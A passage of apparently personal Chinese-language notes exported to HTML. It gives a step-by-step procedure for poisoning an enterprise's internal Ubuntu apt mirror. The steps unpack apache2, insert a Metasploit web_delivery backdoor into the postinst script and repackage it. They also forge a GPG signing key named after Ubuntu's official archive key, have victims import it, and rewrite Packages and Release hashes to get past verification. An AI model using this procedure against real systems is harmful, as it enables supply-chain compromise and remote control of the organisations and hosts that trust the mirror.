href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="20478792-d0f1-4aee-8f7a-0c2bc44e8d6a" class="code"><code class="language-Shell">sudo vim /etc/apt/sources.list</code></pre><p id="f2839ea1-9277-46aa-9c36-2524d620bef6" class="">写入：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="95458b7b-05e1-4530-a083-7e018215d994" class="code"><code class="language-Shell">deb http://&lt;your-server-IP&gt;/ubuntu focal main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-security main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-updates main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-proposed main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-backports main restricted universe multiverse</code></pre></details></li></ul><ul id="141a0568-a532-4f54-a92b-d2107bbc535b" class="toggle"><li><details open=""><summary>将篡改后的某个恶意软件包投入企业自建的更新源中，以apache为例</summary><blockquote id="fff0427e-38bb-804d-8072-dd2e51c17f0c" class="">我们期待的是软件包正常安装，正常运行的同时执行我们的payload</blockquote><p id="eb7f49d4-cf86-47e4-a9a4-cb178d349ef2" class="">1、先获得正常的安装包<div class="indented"><p id="0ea8500b-4f21-4333-8301-f1ee383c9917" class="">这里我们直接在我们刚刚下载到的那个地方去找</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bd413b48-76d4-4961-9b1c-10ffc6ccc3bb" class="code"><code class="language-Shell">sudo find /var/spool/apt-mirror/mirror/ -name apache2</code></pre><figure id="c81aaabf-68b2-4145-ab4f-9320eb240f6b" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image.png"><img style="width:632px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image.png"/></a></figure></div></p><p id="c8cf4866-eb48-43d8-95a5-18dc44932861" class="">2、解包<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="92816c62-6e51-4175-bee4-a2ddcbb781c4" class="code"><code class="language-Shell">mkdir extract
dpkg-deb -x ./apache2_2.4.41-4ubuntu3.14_amd64.deb extract/
dpkg-deb -e ./apache2_2.4.41-4ubuntu3.14_amd64.deb extract/DEBIAN</code></pre></div></p><p id="5e0c04e6-f863-4f0d-b6c4-5e7bc1f1796b" class="">3、投毒<div class="indented"><p id="c5eb4b40-6706-4040-bd2f-f7dd52c863d6" class="">DEBIAN 目录存在四个脚本文件，意义如下：</p><ol type="1" id="f548a673-954d-43bd-a1ac-89a29ddbd080" class="numbered-list" start="1"><li>preinst （预安装脚本）：在软件包被安装之前运行。可用于检查系统资源，准备配置文件等等。一般情况下，这个脚本会检查依赖关系，然后向用户展示安装向导，提示用户是否愿意安装软件包。</li></ol><ol type="1" id="d26832b2-f5fc-4be4-aa88-190034f49c61" class="numbered-list" start="2"><li>postinst （安装后脚本）：在软件包被安装后运行。这个脚本可以用于创建配置文件，启动服务等等。</li></ol><ol type="1" id="4534681d-3015-4866-809b-8805820baf11" class="numbered-list" start="3"><li>prerm （预删除脚本）：在软件被卸载之前运行。可以用于暂停服务，备份数据等等。</li></ol><ol type="1" id="8b98ed8c-e932-48cd-92fa-0500dce8d708" class="numbered-list" start="4"><li>postrm （卸载后脚本）：在软件被卸载后运行。可以执行最后的清理任务，如删除配置文件、日志文件等等。</li></ol><p id="e4b95b70-9271-46fb-b5b0-9436ac433ee1" class="">这次我们就使用 postinst 来完成加载木马的工作</p><p id="531c5a25-c98f-4f5e-920b-efffd462e3ba" class="">（1）msf生成后门<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8fdbcb62-ce87-4d19-ad5f-08ac24c1bc57" class="code"><code class="language-Shell">&gt;use exploit/multi/script/web_delivery #生成恶意python后门指令</code></pre></div></p><p id="6923f512-2b7e-4845-8dfa-7aa54ecdf1ba" class="">（2）将生成的 python 指令放入到 postinst 中<div class="indented"><figure id="1bc1cc90-618e-42a2-a981-c89fedfe66fa" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/22c58dfeaed57fd440d397f0da619bd4.png"><img style="width:608px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/22c58dfeaed57fd440d397f0da619bd4.png"/></a></figure></div></p></div></p><p id="32712008-89d6-40b7-bfb2-ca241cf8a672" class="">4、重新打包好放回去<div class="indented"><p id="59722c34-bdda-42f4-a14a-14c1d0ba3931" class="">打包：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a0c1d1ff-9caa-41f6-950b-1c52b8350fa0" class="code"><code class="language-Shell">dpkg-deb --build extract</code></pre><p id="c9531387-b250-4875-b016-02c58238d1c6" class="">放回去：</p><figure id="63c1cfe9-9935-47b7-8bd5-a4742eddeb50" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%201.png"><img style="width:632px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%201.png"/></a></figure></div></p><p id="17184212-14be-4735-b7a2-670bc526a08d" class="">5、绕过hash检测<div class="indented"><blockquote id="7836bd49-e98a-4d1d-aff2-067a415bc3b1" class="">如果只改软件包的话，内网源服务器的hash校对、文件大小校对、文件签名校对不通过还是会报错”下载失败“，如下：<figure id="294a0309-ed66-4bc4-af64-458c254fd3d4" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%202.png"><img style="width:720px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%202.png"/></a></figure></blockquote><p id="73e16ec5-f2c3-4a42-a3f1-0cc678cdc9d8" class="">有以下两种绕过思路：</p><ul id="2d6a1f1d-7a7b-4c03-9830-2c9a825aa6ae" class="toggle"><li><details open=""><summary>第一种是将软件包文件、记录软件包信息的 Packages 及相关文件、记录 Packages 的 InRelease 文件等全都重新签名，之后在受害服务器中导入我们的签名<mark class="highlight-blue">（不推荐，因为签名文件不权威不能被信任所以需要手动在受害客户端主机中导入！）</mark></summary><p id="14750dad-1aa4-4a5a-92cb-5a8b876b77b4" class=""><strong>1、生成签名</strong><div class="indented"><p id="c9f6d11c-91b0-45d8-89bf-40df623b5e76" class="">在更新源服务器上生成自己的签名文件</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c597c87e-baa5-4fe1-af0f-fefcec2ad340" class="code"><code class="language-Shell">gpg --gen-key
# 这里是为了掩人耳目，输入的名字和email地址就分别填跟官方相同的这两个：
# Ubuntu Archive Automatic Signing Key (2020)
# ftpmaster@ubuntu.com
# 但是注意这只能影响我们的签名文件的UID字段，但是签名文件依然不能自动被客户端主机所信任</code></pre><p id="cfa408be-648b-4294-94c4-2d0d687355ba" class="">然后就是设置一个用来保护签名的密码</p><figure id="87a20e1b-a194-4e90-b5c1-b65af4e0e805" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%203.png"><img style="width:384px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%203.png"/></a></figure><p id="d52715ed-20ff-4fa3-bf01-0eb4d09f316d" class="">然后签名就生成完成了，输入<mark class="highlight-default"><code>gpg --list-keys</code></mark>可以查看确认：</p><figure id="946b4934-3ea7-4efd-b608-fdb6c7da3599" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%204.png"><img style="width:528px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%204.png"/></a></figure></div></p><p id="56d5b476-3728-466f-a414-357ebc5f6292" class=""><strong>2、 对恶意软件包进行签名</strong><div class="indented"><p id="1ca9affb-ded7-4be3-89bf-9cd155b13b37" class="">来到恶意软件包所在目录(这里恶意软件包已经”鸠占鹊巢“了)执行以下命令：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d0e03f86-8d6d-43af-b7c5-b483cf267c5f" class="code"><code class="language-Shell">apt install dpkg-sig
export GPG_TTY=$(tty)
dpkg-sig --sign builder apache2_2.4.41-4ubuntu3.14_amd64.deb</code></pre><p id="2427ca3f-5537-494c-b5d9-40d1f74cbefd" class="">这一过程中需要输入我们刚刚设置的签名密码</p><figure id="fe1661ba-2222-4b32-bd5a-4c06cc21a255" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%205.png"><img style="width:480px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%205.png"/></a><figcaption>注意这里回显的该签名的KEY ID的09DCBEBD663F9F89是”短key“。</figcaption></figure></div></p><p id="1da2a946-b9ce-4a63-8fd1-0fd6bcdaffde" class=""><strong>3、将签名传递给客户端</strong><div class="indented"><blockquote id="2869d557-b15d-4c71-9919-dfc8bd6f7dce" class=""><mark class="highlight-blue">因为签名不权威，不能被客户端主机认可，所以必须手动在客户端上面导入签名</mark>，这里有两种方式：<ul id="133fefca-ef42-483c-a7e2-010c0c4994a9" class="bulleted-list"><li style="list-style-type:disc">源服务器导出GPG密钥文件，之后拷贝到受害服务器里面进行安装</li></ul><ul id="fff0427e-38bb-80c6-874d-cf2b39941cff" class="bulleted-list"><li style="list-style-type:disc">源服务器将密钥上传至公共服务器，受害服务器直接从公共服务器导入</li></ul></blockquote><p id="45704d3a-3fff-49bf-8617-21e8462a4b94" class="">这次演示使用第二种方法</p><p id="941199c5-e05d-47d4-be15-ebc55423e25f" class="">（1）源服务器，根据KEY ID将密钥上传至公共服务器 keyserver.ubuntu.com<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9222c3b6-147d-4a96-b232-a95e0c9aa2cd" class="code"><code class="language-Shell">gpg --send-keys --keyserver keyserver.ubuntu.com &lt;YOUR_KEYID&gt;</code></pre><blockquote id="c3aef21a-28a9-4977-9413-42a4d6632983" class=""><mark class="highlight-default">其中 KEYID 必须用”长key“，可以通过 </mark><mark class="highlight-default"><code>gpg --list-keys</code></mark><mark class="highlight-default">命令获取到：</mark><figure id="08a8df6d-4f65-48a4-88f9-6f7f5ffff9f2" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%206.png"><img style="width:672px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%206.png"/></a></figure></blockquote></div></p><p id="534d1edd-7d54-4b24-a227-931c3e3828f9" class="">（2）受害主机根据KEY ID导入更新源服务器的密钥<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bcb0d4d6-74d0-49cf-8c26-5fbb126d1dbb" class="code"><code class="language-Shell">sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys &lt;YOUR_KEYID&gt; #这里可以使用短key</code></pre></div></p></div></p><p id="1e7a11ed-ce6d-4cbd-be89-4559aa41874f" class="">4、<strong>修改 Packages 相关文件</strong><div class="indented"><blockquote id="f57e79f8-005e-431a-ba44-91879cf74239" class=""> Packages 相关文件记录了服务器提供的所有软件包的信息，包括用于校验的”apache2软件包大小、文件hash值“</blockquote><p id="6096e8a3-1a56-41fe-ae7a-ad2bd0d6ed98" class="">（1）确定要修改哪个Packages文件<div class="indented"><blockquote id="dbf172ba-8c3e-4ea1-9906-a7cbce4f8c06" class="">在给客户端换源时，写入的是以下这四个源<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c844762f-7206-4939-9824-07b2a09950c6" class="code"><code class="language-Shell">deb http://&lt;your-server-IP&gt;/ubuntu focal main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-security main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-updates main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-proposed main restricted universe multiverse
deb http://&lt;your-server-IP&gt;/ubuntu focal-backports main restricted universe multiverse</code></pre><p id="b41ca169-0074-4a2f-bb3f-632bac9b447c" class="">虽然投毒的软件包只有一份，但是它在服务器上会被自动映射成多个源</p><p id="5742a400-5e2e-4661-ad46-79fe9e5af0d9" class="">而每个源都有一个对应的Packages文件，所以我们要先找到包含apache2软件包的源是哪些，才能够对应到要修改的是哪些packages文件</p></blockquote><p id="799205bf-44f0-4179-8695-857138ffd69b" class="">准备一台和被害主机同一版本的主机，同样使用我们搭建的源服务器，然后执行命令：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bfc4783d-1cb2-4e84-be92-7300dfcebe96" class="code"><code class="language-Shell">apt-cache policy apache2</code></pre><p id="3feae905-1924-4d27-8421-8450b936fcbb" class="">结果：</p><figure id="f5716a83-e43f-4bbd-96d4-c95721eb37ae" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%207.png"><img style="width:480px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%207.png"/></a></figure><p id="7af2b8ac-f2f6-42b2-bd17-1383832434d4" class="">可以看到有三个源都有提供apache2，其中：</p><ul id="53584682-3924-4466-bf8f-b8e15915c9ca" class="bulleted-list"><li style="list-style-type:disc">因为优先获取新版本，而ubantu focal这个源的版本比较旧，所以它不会被优先获取，排除</li></ul><ul id="964cbca8-576e-4915-b4d4-6375506eae04" class="bulleted-list"><li style="list-style-type:disc">ubantu focal-security和ubantu focal-updates的版本一样，但是在客户端的源配置文件中是ubantu focal-security写在前面，所以也排除ubantu focal-updates</li></ul><p id="b5f1c8c5-6fb6-466d-9ee6-176006f117ff" class="">所以我们可以确定——只需要修改ubantu focal-security这个源对应的Packages文件（为了保险起见，也可以将三个源中的Packages 等相关文件都改了，但这是个麻烦事 🥲）</p></div></p><p id="ebd3197f-e7b2-4db7-9215-9792eca78824" class="">（2）修改Packages文件处<div class="indented"><p id="62ee40db-fdf0-4fd6-bc8b-09e1c01eed35" class="">ubantu focal-security这个源对应的Packages文件位置，和这里所有的文件如下：</p><figure id="08ac17a3-c062-4a4c-b888-ede65baf88ad" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%208.png"><img style="width:1302px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%208.png"/></a></figure><p id="dfc391d5-dca8-4623-b216-3a02c81d0e95" class=""><mark class="highlight-default">直接删除 </mark><mark class="highlight-default"><code>Packages.gz</code></mark><mark class="highlight-default"> 和 </mark><mark class="highlight-default"><code>Packages.xz</code></mark></p><p id="3c739bea-a2f7-4d43-9a83-6a343f66e304" class="">重新计算我们投毒后的Apache2包文件的大小和hash，指令如下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="82e27386-006f-4a37-a314-136c5afabb91" class="code"><code class="language-Shell">ls -al Apache2包文件路径 #查看修改后的大小
md5sum Apache2包文件路径 #计算修改后的文件hash值，下同
sha1sum Apache2包文件路径
sha256sum Apache2包文件路径
sha512sum Apache2包文件路径</code></pre><p id="99d41d62-96f0-47e7-b858-3b87057fd2c4" class="">然后修改Packages文件：</p><figure id="ae4c4596-a467-492f-8681-ca7a38107f36" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%209.png"><img style="width:1352px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%209.png"/></a></figure><p id="50f55b95-685d-42e1-9cdf-4e8556f757f1" class="">重新压缩 Packages 文件到当前目录下：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bfc068d9-ad2d-4dea-b41f-c5d48d57ebe9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">gzip -k Packages
xz -k Packages</code></pre></div></p></div></p><p id="aee07b6e-655d-416e-82ad-10f7a6aaf37a" class=""><strong>5、修改InRelease相关文件</strong><div class="indented"><blockquote id="1ce5ec08-6966-402b-a458-66854e4de0fb" class="">Release 中保存了各个 Packages 以及相关文件的大小路径和hash等信息</blockquote><p id="5741f2bf-a692-4afd-a792-c3774d79095c" class="">1、找到InRelease相关文件<div class="indented"><p id="30f30760-5a6d-43ff-8ee6-ed179f096854" class="">相关文件位置在/var/spool/apt-mirror/mirror/archive.ubuntu.com/ubuntu/dists/focal-security，有如下这些文件</p><figure id="d5c36c5c-2764-4501-adf0-3e154ddf7a3a" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%2010.png"><img style="width:768px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/image%2010.png"/></a></figure></div></p><p id="1052ad0c-947e-429c-9290-45d4dcfdb1b7" class="">2、修改Release文件<div class="indented"><p id="ce91f28b-531e-448f-996a-9860add0ec54" class="">先分别计算出修改后的Packages，和重新压缩后得到的Packages.gz、Packages.xz的大小和hash，相关指令见上一步</p><p id="a0815edb-b3d8-47d9-b459-336910241a4b" class=""> </p></div></p></div></p></details></li></ul><ul id="870c8bfd-469f-468e-b55e-64b15898700b" class="toggle"><li><details open=""><summary>第二种方法是只要修改系统上部分文件内容，就可以实现绕过对软件包的校验<mark class="highlight-blue">(推荐！)</mark></summary><p id="78d42a60-c132-42ba-bde1-5fa011d59c86" class="">
</p></details></li></ul></div></p><p id="1b218faa-a283-4ccc-9bc3-4717d49d15a3" class="">6、受害客户端主机安装被投毒的apache2，一键连！<div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97ded727-70cd-484a-ab0d-9dec8be7eb3e" class="code"><code class="language-Shell">sudo apt update 
sudo apt install apache2</code></pre><figure id="2219dfc6-0224-4b34-a3b6-c0f66831fda5" class="image"><a href="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/33fa8f90c96b8b56d4171ca72cced144.png"><img style="width:768px" src="%E4%B8%8B%E8%BD%BD%E3%80%81%E5%AE%89%E8%A3%85%E6%8C%87%E4%BB%A4%20225c236c2bd14b27bddca1788ac20662/33fa8f90c96b8b56d4171ca72cced144.png"/></a></figure></div></p></details></li></ul></div></p><h1 id="8db3af00-51e3-485c-a55f-78b5baa832e6" class="">三、其他</h1><h3 id="3f43d076-d621-4788-82dd-0d05025be2e3" class="">1-.appimage文件</h3><p id="ecd9bc59-34e9-46a3-b430-8bdb5e2800f7" class="">这种类型文件是在linux系统上的一个一键打包程序，只需要在终端运行之即可：</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" 